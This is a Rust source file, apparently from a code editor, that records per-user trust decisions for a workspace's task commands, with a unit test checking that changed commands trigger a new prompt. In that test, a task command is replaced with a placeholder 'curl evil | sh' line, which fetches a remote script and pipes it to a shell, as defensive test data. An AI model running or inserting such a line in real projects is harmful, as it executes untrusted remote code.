//! Per-user trust decisions, keyed by workspace path + hash of its commands.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use super::config::WorkspaceConfig;
use crate::buffer::file;
use crate::paths;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Trust {
    /// No commands in `.workspace`, nothing to decide.
    NotNeeded,
    Trusted,
    Restricted,
    /// Commands present (or changed) and no decision yet: ask.
    Undecided,
}

#[derive(Debug, Default, Clone, Serialize, Deserialize)]
struct TrustFile {
    #[serde(default, rename = "workspace")]
    workspaces: Vec<Entry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Entry {
    path: PathBuf,
    commands_hash: String,
    trusted: bool,
}

#[derive(Debug, Clone)]
pub struct TrustStore {
    path: PathBuf,
    file: TrustFile,
}

impl TrustStore {
    pub fn default_path() -> PathBuf {
        paths::state_dir().join("trust.toml")
    }

    /// Blocking. A missing or unreadable file starts empty (everything is asked again).
    pub fn load(path: PathBuf) -> Self {
        let file = match std::fs::read_to_string(&path) {
            Ok(text) => toml::from_str(&text).unwrap_or_else(|e| {
                tracing::warn!(path = %path.display(), "unreadable trust file, ignoring: {e}");
                TrustFile::default()
            }),
            Err(_) => TrustFile::default(),
        };
        Self { path, file }
    }

    pub fn evaluate(&self, root: &Path, config: &WorkspaceConfig) -> Trust {
        if !config.has_commands() {
            return Trust::NotNeeded;
        }
        let hash = config.commands_hash();
        match self
            .file
            .workspaces
            .iter()
            .find(|e| e.path == root && e.commands_hash == hash)
        {
            Some(e) if e.trusted => Trust::Trusted,
            Some(_) => Trust::Restricted,
            None => Trust::Undecided,
        }
    }

    /// Records a decision, replacing any earlier one for this workspace.
    pub fn record(&mut self, root: &Path, config: &WorkspaceConfig, trusted: bool) {
        self.file.workspaces.retain(|e| e.path != root);
        self.file.workspaces.push(Entry {
            path: root.to_path_buf(),
            commands_hash: config.commands_hash(),
            trusted,
        });
    }

    /// Blocking: call from `spawn_blocking`.
    pub fn write(&self) -> std::io::Result<()> {
        if let Some(dir) = self.path.parent() {
            std::fs::create_dir_all(dir)?;
        }
        let text = toml::to_string(&self.file).map_err(std::io::Error::other)?;
        file::atomic_write(&self.path, text.as_bytes())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decisions_follow_command_changes() {
        let dir = tempfile::tempdir().unwrap();
        let store_path = dir.path().join("trust.toml");
        let root = Path::new("/projects/a");
        let mut config = WorkspaceConfig::parse("[tasks.build]\ncommand = \"make\"").unwrap();

        let mut store = TrustStore::load(store_path.clone());
        assert_eq!(store.evaluate(root, &WorkspaceConfig::default()), Trust::NotNeeded);
        assert_eq!(store.evaluate(root, &config), Trust::Undecided);

        store.record(root, &config, true);
        store.write().unwrap();
        let store = TrustStore::load(store_path.clone());
        assert_eq!(store.evaluate(root, &config), Trust::Trusted);
        assert_eq!(store.evaluate(Path::new("/projects/b"), &config), Trust::Undecided);

        config.tasks.get_mut("build").unwrap().command = "curl evil | sh".into();
        assert_eq!(
            store.evaluate(root, &config),
            Trust::Undecided,
            "changed commands ask again"
        );

        let mut store = store;
        store.record(root, &config, false);
        assert_eq!(store.evaluate(root, &config), Trust::Restricted);
    }
}
